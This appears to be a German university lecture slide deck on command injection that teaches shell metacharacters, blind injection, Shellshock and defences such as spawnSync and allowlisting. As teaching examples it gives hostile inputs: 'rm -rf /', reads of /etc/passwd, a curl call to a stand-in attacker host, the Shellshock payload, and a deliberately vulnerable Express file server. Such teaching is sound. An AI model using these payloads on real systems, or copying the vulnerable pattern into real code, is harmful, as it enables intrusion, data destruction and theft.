@@ -1,0 +1,380 @@
+---
+pagetitle: "Command Injection"
+date: today
+date-format: "DD.MM.YYYY"
+veranstaltung: "Command Injection"
+studiengang: "HTW Dresden"
+professor: "Prof. Dr. Lukas Iffländer"
+---
+
+<!-- Titelbild hier aendern:
+     src: Bilddatei
+     --title-image-width: Bild breiter/schmaler machen
+     --title-image-right: negative Werte schieben nach rechts, positive nach links
+     --title-image-top: negative Werte schieben nach oben, positive nach unten
+     --title-image-object-position: Ausschnitt innerhalb der Bildbox verschieben -->
+## Command Injection {.title-slide data-state="hide-footer"}
+
+<img class="title-image" src="../../images/datenschutz.jpg" alt="" style="--title-image-width: 120vw; --title-image-right: -500px; --title-image-top: 0px; --title-image-height: 100vh; --title-image-object-position: right right;">
+
+Prof. Dr. Lukas Iffländer   
+HTW Dresden  
+{{< meta date >}}
+
+---
+
+## Agenda {.content-slide .agenda-slide}
+
+<ul class="agenda">
+<li class="agenda-item"><strong>01</strong><span>Rückschau</span></li>
+<li class="agenda-item"><strong>02</strong><span>Grundidee</span></li>
+<li class="agenda-item"><strong>03</strong><span>Shell-Metazeichen</span></li>
+<li class="agenda-item"><strong>04</strong><span>Blind Command Injection</span></li>
+<li class="agenda-item"><strong>05</strong><span>Fallstudie Shellshock</span></li>
+<li class="agenda-item"><strong>06</strong><span>Schutzmaßnahmen</span></li>
+</ul>
+
+---
+
+## Rückschau: Code Injection {.content-slide .pdf-slide}
+<br>
+
+- Wir haben bereits Cross-Site-Scripting (XSS) kennengelernt
+- Nutzerdaten werden empfangen, manipuliert und lösen Aktionen aus
+- Der Code, den der Interpreter ausführt ist eine Mischung aus Instruktionen die durch den
+Programmierer vorgegeben sind und Daten aus Nutzereingaben
+- Angreifer injizieren Eingaben, die aus dem Kontext ausbrechen können
+- Angreifereingaben werden als Code interpretiert, der ausgeführt wird, als wäre er vom Originalentwickler
+
+---
+
+## Lernziele {.content-slide .pdf-slide}
+<br>
+
+#### Nach dieser Vorlesung können Sie:
+
+1. Command Injection von anderen Injection-Angriffen abgrenzen
+2. Shell-Metazeichen erkennen, die Injection ermöglichen
+3. Blind Command Injection erklären und erkennen
+4. Sichere Alternativen zu Shell-Aufrufen implementieren
+
+---
+
+## Command Injection {.content-slide .pdf-slide}
+<br>
+
+::: {.callout-note title="Ziel"}
+Beliebige Befehle auf dem Zielsystem durch eine verwundbare Anwendung ausführen.
+:::
+<br>
+
+::: {.callout-note title="Bedingung"}
+Command Injection ist möglich, wenn eine Anwendung Nutzereingaben direkt an ein
+Betriebssystem (in der Regel eine Shell) weitergibt.
+:::
+
+
+---
+
+## Command Injection {.content-slide .code-slide}
+### Beispiel
+<br>
+
+
+#### Verwundbarer Code
+
+```javascript
+const filename = process.argv[2]
+const stdout = childProcess.execSync(`cat ${filename}`)
+console.log(stdout.toString())
+```
+
+#### Gutartige Eingabe
+
+```text
+file.txt
+```
+
+#### Ausgeführter Befehl
+
+```bash
+cat file.txt
+```
+
+---
+
+## Command Injection {.content-slide .code-slide}
+### Beispiel II
+<br>
+
+#### Verwundbarer Code
+```javascript
+const filename = process.argv[2]
+const stdout = childProcess.execSync(`cat ${filename}`)
+console.log(stdout.toString())
+```
+
+#### Bösartige Eingabe
+
+```text
+file.txt; rm -rf /
+```
+
+#### Ausgeführter Befehl
+
+```bash
+cat file.txt; rm -rf /
+```
+
+---
+
+## Shell-Metazeichen {.content-slide .pdf-slide}
+<br>
+
+#### Befehlsverkettung
+
+| Zeichen | Bedeutung | Beispiel |
+|---|---|---|
+| `;` | Sequentielle Ausführung | `cmd1; cmd2` |
+| `&&` | Ausführung bei Erfolg | `cmd1 && cmd2` |
+| `||` | Ausführung bei Fehler | `cmd1 || cmd2` |
+| `|` | Pipe, Ausgabe weiterleiten | `cmd1 | cmd2` |
+| `&` | Hintergrundausführung | `cmd1 & cmd2` |
+
+---
+
+## Shell-Metazeichen {.content-slide .code-slide}
+
+### Command Substitution
+<br>
+
+#### Eingebettete Befehle
+
+| Syntax | Beispiel |
+|---|---|
+| `$(cmd)` | `echo $(whoami)` |
+|  `cmd` | echo `id` | 
+
+::: {.callout-important title="Gefahr"}
+Eingebettete Befehle werden zuerst ausgeführt und deren Ausgabe in den äußeren Befehl eingesetzt.
+:::
+
+#### Angriff
+
+```bash
+Eingabe: $(cat /etc/passwd)
+Befehl:  echo "Hallo $(cat /etc/passwd)"
+```
+
+---
+
+## Blind Command Injection {.content-slide .pdf-slide}
+<br>
+
+::: {.callout-important title="Problem"}
+Manchmal wird die Ausgabe des Befehls nicht zurückgegeben. Der Angreifer sieht also keinen direkten Output.
+:::
+
+::: {.callout-note title="Erkennungstechniken"}
+- Time-based: `; sleep 10` - Verzögerung messbar?
+- Out-of-band: `; curl attacker.com/$(whoami)`
+- File-based: `; whoami > /var/www/html/out.txt`.
+:::
+
+
+---
+
+## Blind Command Injection {.content-slide .code-slide}
+
+### Time-based Beispiel
+<br>
+
+::: {.callout-note title="Testschritte"}
+1. Normale Anfrage: Antwortzeit ungefähr `200ms`
+2. Injection mit `; sleep 5`: Antwortzeit ungefähr `5200ms`
+3. Differenz ungefähr 5 Sekunden: Injection erfolgreich
+:::
+
+::: {.callout-important title="Datenexfiltration"}
+```bash
+; if [ $(whoami | cut -c1) = "r" ]; then sleep 5; fi
+```
+Zeichen-für-Zeichen-Extraktion durch Zeitmessung.
+:::
+
+---
+
+## Betriebssystem-Unterschiede {.content-slide .pdf-slide}
+<br>
+
+
+#### Linux/Unix vs. Windows   
+
+| Funktion | Linux/Unix | Windows |
+|---|---|---|
+| Sequenz | `;` | `&` |
+| Pipe | `|` | `|` |
+| UND | `&&` | `&&` |
+| ODER | `||` | `||` |
+| Substitution | `$()` oder `` ` `` | `%var%` |
+| Kommentar | `#` | `REM` oder `::` |
+
+<br>
+
+::: {.callout-important title="Wichtig"}
+Angreifer müssen das Zielbetriebssystem kennen oder beide Varianten testen.
+:::
+
+---
+
+## Fallstudie: Shellshock (CVE-2014-6271) {.content-slide .pdf-slide}
+<br>
+
+#### Was war Shellshock?
+
+- Schwachstelle in GNU Bash im September 2014
+- Umgebungsvariablen konnten Code enthalten
+- Betraf Millionen von Servern weltweit
+
+#### Angriff über CGI
+
+HTTP-Header wurden als Umgebungsvariablen an CGI-Skripte übergeben. Ein manipulierter User-Agent führte zur Code-Ausführung.
+<br>
+
+**CVSS Score:** 10.0 (Critical) - maximale Schwere
+
+---
+
+## Fallstudie: Shellshock {.content-slide .code-slide}
+
+### Technische Details
+<br>
+
+#### Verwundbarer Payload
+
+```bash
+() { :; }; /bin/bash -c "cat /etc/passwd"
+```
+
+#### Ablauf
+
+1. Bash interpretiert Funktionsdefinition: `() { :; }`
+2. Bug: Bash führt Code nach der Definition aus
+3. `/bin/bash -c "cat /etc/passwd"` wird ausgeführt
+
+#### Betroffene Dienste
+
+CGI-Skripte, DHCP-Clients, SSH mit `ForceCommand`, Git-Server
+
+---
+
+## Command Injection {.content-slide .code-slide}
+
+### Unsicherer Datei-Server
+<br>
+
+```{.javascript code-line-numbers="|1|3-11|13-17|19"}
+const app = express()
+
+app.get('/', (req, res) => {
+    res.send(`
+        <h1>File viewer</h1>
+        <form method='GET' action='/view'>
+            <input name='filename' />
+            <input type='submit' value='Submit' />
+        </form>
+    `)
+})
+
+app.get('/view', (req, res) => {
+    const { filename } = req.query
+    const stdout = childProcess.execSync(`cat ${filename}`)
+    res.send(stdout.toString())
+})
+
+app.listen(8000, '127.0.0.1')
+```
+
+---
+
+## Command Injection {.content-slide .code-slide}
+
+### Sicherer Datei-Server
+<br>
+
+```{.javascript code-line-numbers="|1|2|3|4-8"}
+app.get('/view', (req, res) => {
+    const { filename } = req.query
+    const child = childProcess.spawnSync('cat', [filename])
+    if (child.status !== 0) {
+        res.send(child.stderr.toString())
+    } else {
+        res.send(child.stdout.toString())
+    }
+})
+```
+
+---
+
+## Befehle sicher ausführen {.content-slide .code-slide}
+<br>
+
+
+::: {.callout-important title="Unsicher"}
+```javascript
+const filename = process.argv[2]
+const stdout = childProcess.execSync(`cat ${filename}`)
+```
+:::
+
+::: {.callout-tip title="Sicher"}
+```javascript
+const filename = process.argv[2]
+const { stdout } = childProcess.spawnSync('cat', [filename])
+```
+:::
+
+
+
+---
+
+## Verteidigungsstrategien {.content-slide .pdf-slide}
+<br>
+
+#### Best Practices
+
+1. **Shell-Aufrufe vermeiden:** Bibliotheksfunktionen statt `exec()` oder `system()`
+2. **Parametrisierte APIs nutzen:** `execFile()` statt `exec()`
+3. **Allowlisting:** Nur erlaubte Zeichen oder Werte akzeptieren
+4. **Escaping:** Shell-Metazeichen maskieren, wenn Shell-Aufrufe unvermeidbar sind
+5. **Least Privilege:** Anwendung mit minimalen Rechten ausführen
+
+---
+
+## Zusammenfassung {.content-slide .pdf-slide}
+<br>
+
+✓ Command Injection: Nutzereingaben werden als Shell-Befehle ausgeführt  
+
+✓ Shell-Metazeichen ermöglichen Befehlsverkettung  
+
+✓ Blind Injection liefert keine direkte Ausgabe, bleibt aber gefährlich  
+
+✓ OS-Unterschiede beachten: Linux/Unix vs. Windows  
+
+✓ Verteidigung: Shell-Aufrufe vermeiden und parametrisierte APIs nutzen  
+<br>
+
+#### OWASP-Einordnung:
+
+Command Injection ist Teil von **A03:2021 - Injection**.
+
+---
+
+## Vielen Dank! {.title-slide data-state="hide-footer"}
+
+<img class="title-image" src="../../images/datenschutz.jpg" alt="" style="--title-image-width: 120vw; --title-image-right: -500px; --title-image-top: 0px; --title-image-height: 100vh; --title-image-object-position: right right;">
+
+Prof. Dr. Lukas Iffländer   
+HTW Dresden  
+{{< meta date >}}
